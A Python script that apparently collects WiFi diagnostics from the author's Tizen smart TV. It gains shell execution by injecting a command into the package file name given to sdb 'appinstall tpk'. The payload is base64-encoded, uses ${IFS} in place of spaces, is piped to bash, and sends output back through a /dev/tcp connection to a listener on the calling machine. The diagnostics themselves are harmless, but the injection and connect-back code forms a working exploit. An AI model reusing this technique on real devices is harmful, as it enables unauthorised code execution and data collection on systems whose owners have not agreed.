import base64
from pathlib import Path
import socket
import subprocess
import uuid

TV_HOST = "192.168.0.14"
SERIAL = f"{TV_HOST}:26101"
SDB = str(Path(__file__).resolve().parent / ".local/tizen-sdk/tools/sdb.exe")

def run_sdb(*args, timeout=15):
    cmd = [SDB, *args]
    res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return res.stdout + res.stderr

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    s.connect((TV_HOST, 9))
    local_ip = s.getsockname()[0]

script_content = """#!/bin/bash
echo "=== WIFI CHIP & DRIVER MODULES ==="
lsmod 2>&1 || true
cat /proc/modules 2>&1 || true

echo "=== WLAN INTERFACE SYSFS ==="
for f in /sys/class/net/wlan0/*; do
    if [ -f "$f" ]; then
        echo -n "$f: "
        cat "$f" 2>/dev/null || echo "<unreadable>"
    fi
done

echo "=== VCONF NETWORK PREFERENCES ==="
vconftool get db/wifi/ssid 2>/dev/null || true
vconftool get db/wifi/bssid 2>/dev/null || true
vconftool get db/wifi/frequency 2>/dev/null || true
vconftool get db/wifi/channel 2>/dev/null || true
vconftool get db/wifi/rssi 2>/dev/null || true
vconftool get db/wifi/ip 2>/dev/null || true
vconftool get db/wifi/state 2>/dev/null || true
vconftool get db/network/default_iface 2>/dev/null || true

echo "=== ROUTER PING TEST (192.168.0.1) ==="
ping -c 4 -W 2 192.168.0.1 2>&1

echo "=== GOOGLE PING TEST (8.8.8.8) ==="
ping -c 4 -W 2 8.8.8.8 2>&1

echo "=== WIFI CLI / TOOLS ==="
which iwconfig iw wpa_cli iwpriv connmanctl net-config 2>&1 || true

echo "=== WPA_SUPPLICANT CONF / LOG ==="
ls -la /opt/etc/wpa_supplicant/ 2>/dev/null || true
ls -la /var/run/wpa_supplicant/ 2>/dev/null || true
cat /tmp/wifi* 2>/dev/null || true
cat /tmp/wpa* 2>/dev/null || true

echo "=== SCRIPT COMPLETE ==="
"""

token = uuid.uuid4().hex[:8]
local_script_path = Path(__file__).resolve().parent / f".local/diag3-{token}.sh"
local_script_path.write_text(script_content, newline="\n")

remote_script = f"/home/owner/share/tmp/sdk_tools/diag3-{token}.sh"
run_sdb("-s", SERIAL, "push", str(local_script_path), remote_script)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((local_ip, 0))
    listener.listen(1)
    listener.settimeout(15)
    port = listener.getsockname()[1]

    command = f"exec 3<>/dev/tcp/{local_ip}/{port};cat {remote_script}|bash >&3 2>&3;exec 3>&-"
    script = f"/bin/mkdir /tmp/d3-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode()).decode()
    name = f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    arg = f"0 appinstall tpk {name}"

    proc = subprocess.Popen([SDB, "-s", SERIAL, "shell", arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        conn, peer = listener.accept()
        chunks = []
        with conn:
            conn.settimeout(10)
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                chunks.append(data)
        output = b"".join(chunks).decode(errors="replace")
        print(output)
        (Path(__file__).resolve().parent / "wifi_sysfs_vconf.txt").write_text(output, encoding="utf-8")
    finally:
        if proc.poll() is None:
            proc.terminate()
        local_script_path.unlink(missing_ok=True)
